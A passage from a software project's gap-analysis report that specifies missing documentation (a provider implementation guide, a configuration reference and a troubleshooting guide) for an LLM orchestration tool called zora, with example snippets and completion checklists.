1. **Provider Interface Overview:**
   - Required methods and signatures
   - Event types providers must emit
   - Error handling expectations
   - Configuration structure

2. **Step-by-Step Checklist:**
   - Copy provider template
   - Implement required methods
   - Add error handling
   - Add provider to Router
   - Register in Orchestrator
   - Add tests
   - Update configuration schema

3. **Example Implementation:**
   - Minimal stub provider showing all required pieces
   - Comments explaining each section
   - Links to full implementations for reference

4. **Testing Requirements:**
   - Unit tests for provider methods
   - Integration tests with ExecutionLoop
   - Error handling tests

5. **Common Patterns:**
   - How to handle streaming responses
   - How to classify errors
   - How to emit events correctly
   - How to manage credentials/config

Example snippet:
```markdown
# Provider Implementation Guide

## Step 1: Create Provider File

Create `/src/providers/my-provider.ts`:

\`\`\`typescript
import { LLMProvider, ExecutionRequest, AgentEvent } from '../types';

export class MyProvider implements LLMProvider {
  // 1. Constructor: accept config
  constructor(config: MyProviderConfig) {
    this.config = config;
  }

  // 2. Implement execute method
  async *execute(request: ExecutionRequest): AsyncGenerator<AgentEvent> {
    // Call your API
    // Yield events as you receive output
    // Handle errors properly (see error handling section)
  }

  // 3. Implement checkAuth method
  async checkAuth(): Promise<boolean> {
    // Validate API key/credentials
  }
}
\`\`\`

## Step 2: Register in Router
...
```

#### Why It Matters
Provider implementation guide enables:
1. **Extensibility:** Add new providers quickly without reverse-engineering
2. **Consistency:** New providers follow same patterns as existing ones
3. **Reduced Errors:** Clear requirements prevent missing implementations
4. **Community:** External contributors can add providers independently
5. **Maintenance:** Consistent patterns easier to refactor/improve

#### Remediation Approach
**Strategy:** Create comprehensive provider implementation guide with template, checklist, examples, and links to reference implementations. Document interface, events, error handling, and testing requirements.

**Affected Files:**
- `/home/user/zora/docs/PROVIDER_IMPLEMENTATION_GUIDE.md` — New guide
- `/home/user/zora/src/providers/provider-template.ts` — Template with comments
- Update provider README if exists

**Dependencies:** None - can be written independently

**Test Coverage:**
- N/A (documentation)

**Definition of Done:**
- [ ] Provider implementation guide created
- [ ] Guide includes interface overview and method signatures
- [ ] Step-by-step implementation checklist provided
- [ ] Example provider template with comments
- [ ] Testing requirements documented
- [ ] Common patterns and error handling explained

---

### DOC-04: Configuration Reference Incomplete
**Severity:** S3 | **Functionality Impact:** 1 | **Reliability:** 2 | **Security:** 1
**Effort:** 1h | **Blocking:** N | **Status:** Open

#### Description
Policy file format is documented but `config.toml` is only partially explained. Users misconfigure routing rules, retry settings, budget limits, and provider fallbacks because configuration options are unclear. No examples of complete valid configuration.

#### Current State
- **Location:** `/home/user/zora/config.toml` (example/template)
- **Current Docs:** Policy format documented; config.toml largely undocumented
- **Problem:**
```toml
# Current config.toml lacks detailed explanation
[providers]
claude = { apiKey = "...", model = "claude-3-opus" }
# What other fields are available?
# What's the difference between model names?
# What are valid timeout values?

[routing]
# How does routing work? What are valid strategies?
# What does 'threshold' mean?
# How are weights used?

[retry]
# What do these settings mean?
# What are reasonable values?
# How does backoff work?
```
- **Related Gaps:** DOC-01 (Inline Explanations), DOC-03 (Provider Guide)

#### Expected State
Complete TOML schema documentation with:
1. **All Top-Level Sections:** providers, routing, retry, budget, logging, etc.
2. **Per-Section Explanation:**
   - Purpose of section
   - Valid keys and value types
   - Default values if applicable
   - Constraints (min/max, valid options)

3. **Provider-Specific Settings:**
   - claude: valid models, parameters
   - gemini: valid models, vision options
   - ollama: base URL, model format, pullIfMissing

4. **Routing Configuration:**
   - Routing strategy options (classification, round-robin)
   - Task classification thresholds
   - Provider preferences
   - Fallback order

5. **Retry Configuration:**
   - Max retry attempts
   - Backoff strategy
   - Exponential vs. linear
   - Min/max delays

6. **Example Configurations:**
   - Simple (single provider)
   - Multi-provider with routing
   - High-reliability (retry+fallback)
   - Cost-optimized (Ollama for simple tasks)

Example documentation:
```markdown
# Configuration Reference

## [providers] Section
Configure LLM providers.

### claude
Claude API provider.
- apiKey (string, required): Claude API key
- model (string): "claude-3-opus", "claude-3-sonnet", "claude-3-haiku"
  Default: "claude-3-opus"
- maxTokens (number): Max tokens per request. Default: 4096
- temperature (number): 0-1, creativity. Default: 0.7

Example:
\`\`\`toml
[providers.claude]
apiKey = "sk-ant-..."
model = "claude-3-opus"
temperature = 0.7
\`\`\`

### ollama
Local Ollama provider.
- baseUrl (string): Ollama server URL. Default: "http://localhost:11434"
- model (string, required): Model name (e.g., "llama2", "mistral")
- pullIfMissing (boolean): Auto-pull model if not found. Default: true

...
```

#### Why It Matters
Complete configuration documentation enables:
1. **Correct Configuration:** Users understand all available options
2. **Faster Troubleshooting:** Reference valid values quickly
3. **Best Practices:** Examples show recommended configurations
4. **Self-Service:** Users solve problems without support
5. **Migration:** Users can adapt config when switching providers

#### Remediation Approach
**Strategy:** Create comprehensive configuration reference documenting all TOML sections, keys, valid values, defaults, and examples. Include example configurations for common use cases.

**Affected Files:**
- `/home/user/zora/docs/CONFIGURATION_REFERENCE.md` — New reference
- `/home/user/zora/config.example.toml` — Example with comments

**Dependencies:** None - can be written independently

**Test Coverage:**
- N/A (documentation)

**Definition of Done:**
- [ ] Configuration reference created with all sections documented
- [ ] Each key documented with type, default, constraints
- [ ] Provider-specific settings explained
- [ ] Routing and retry configuration examples provided
- [ ] Example configurations for common use cases
- [ ] Reference linked from main README

---

### DOC-05: No Troubleshooting Guide
**Severity:** S3 | **Functionality Impact:** 1 | **Reliability:** 2 | **Security:** 1
**Effort:** 2h | **Blocking:** N | **Status:** Open

#### Description
When users encounter issues ("Task failed", "Provider timeout", "Authentication error"), they have no troubleshooting guide. Support burden is high; users frustrated. No common issues documented with solutions.

#### Current State
- **Location:** No troubleshooting guide exists
- **Current Support Pattern:**
```
User: "My task keeps failing"
Support: "Check logs" (logs are unstructured, not helpful)
User: "How do I debug?"
Support: No documented troubleshooting steps
```
- **Related Gaps:** LOG-01 (Structured Logging), DOC-01 (Explanations)

#### Expected State
Troubleshooting guide at `/docs/TROUBLESHOOTING.md` covering:

1. **Common Issues & Solutions:**
   - Authentication failures (token expired, invalid key)
   - Provider timeouts (network, provider overload)
   - Quota/rate limit errors (retry strategy, fallback)
   - Memory/resource issues
   - Configuration errors

2. **Debugging Techniques:**
   - How to enable debug logging (LOG_LEVEL=DEBUG)
   - How to read structured JSON logs
   - How to filter logs by task ID or provider
   - How to check provider health (/health endpoint)
   - How to review configuration (config dump)

3. **Provider-Specific Issues:**
   - Claude: rate limiting, token expiry, context overflow
   - Gemini: auth failures, quota limits, JSON parsing errors
   - Ollama: connection refused, model not found, memory issues

4. **System-Level Issues:**
   - No providers available (all degraded)
   - Event stream timeout (hung provider)
   - Audit log failures (disk space)
   - Memory growth/leaks

5. **Performance Issues:**
   - Slow responses (provider overload, model size)
   - High latency (network issues, retry backoff)
   - Resource usage (memory, CPU)

Example structure:
```markdown
# Troubleshooting Guide

## Issue: "Authentication Failed"

### Symptoms
- Task fails with error: `{"type": "error", "code": "auth_failed"}`
- Logs show: `error: "Provider authentication failed"`

### Root Causes
1. API key expired
2. API key invalid/revoked
3. Wrong API key for provider
4. Insufficient permissions

### Solution Steps

1. **Check API key validity:**
   - Claude: https://console.anthropic.com/account/keys
   - Gemini: https://ai.google.dev/
   - Verify key format and no typos

2. **Enable debug logging:**
   ```bash
   LOG_LEVEL=DEBUG ./zora start
   ```
   Look for provider auth checks in logs

3. **Check configuration:**
   ```bash
   ./zora config show
   ```
   Verify correct provider and API key configured

4. **Test provider directly:**
   ```bash
   ./zora test-provider claude
   ```
   Verify credentials work outside orchestrator

5. **Check expiry:**
   ```bash
   curl https://api.anthropic.com/v1/me
   ```
   Confirm token is not expired

### Prevention
- Set calendar reminder to rotate keys monthly
- Monitor /health endpoint for auth warnings 24h before expiry
- Use long-lived service account keys when possible

---

## Issue: "Task Timeout"
...
```

#### Why It Matters
Troubleshooting guide enables:
1. **Self-Service Support:** Users solve problems independently
2. **Reduced Support Load:** Common issues resolved without tickets
3. **Faster Resolution:** Users know debugging steps
4. **User Satisfaction:** Clear path to problem resolution
5. **System Improvement:** Common issues identified for permanent fixes

#### Remediation Approach
**Strategy:** Create comprehensive troubleshooting guide with sections for common issues, debugging techniques, provider-specific problems, and performance troubleshooting. Include examples and step-by-step solutions.

**Affected Files:**
- `/home/user/zora/docs/TROUBLESHOOTING.md` — New guide

**Dependencies:** LOG-01 (Structured Logging) — guide references debug logging

**Test Coverage:**
- N/A (documentation)

**Definition of Done:**
- [ ] Troubleshooting guide created with common issues
- [ ] Each issue includes symptoms, root causes, and solutions
- [ ] Debug techniques documented (enabling debug logs, reading logs)
- [ ] Provider-specific issues covered
- [ ] System-level issues covered
- [ ] Performance troubleshooting section included
- [ ] Guide linked from main README

---

### Summary Table: Documentation Gaps

| Gap ID | Issue | Severity | Effort | Impact |
|--------|-------|----------|--------|--------|
| DOC-01 | Sparse Inline Explanations | S3 | 2h | New contributors struggle; refactoring risky |
| DOC-02 | No Architecture Decision Records | S3 | 3h | Can't explain design to new team members |
| DOC-03 | Provider Implementation Guide Missing | S3 | 2h | Hard to extend to new providers |
| DOC-04 | Configuration Reference Incomplete | S3 | 1h | Users misconfigure routing/retry/budget |
| DOC-05 | No Troubleshooting Guide | S3 | 2h | High support burden; users frustrated |

**Cumulative Effort:** 10 hours
**Impact:** Onboarding difficult; maintainability at risk; support burden high

---

## Next Steps

**To begin remediation:**
1. Review detailed gap specifications in Phase 2
2. Identify available resources/team capacity
3. Follow recommended execution order (Foundation → Core → Operational)
4. Run quick wins first for immediate team momentum

**Tracking:**
- Update **Status** column as work progresses (Open → In Progress → Completed)
- Record actual effort vs. estimated effort for future planning
- Note any discovered dependencies or blockers in gap detail sections
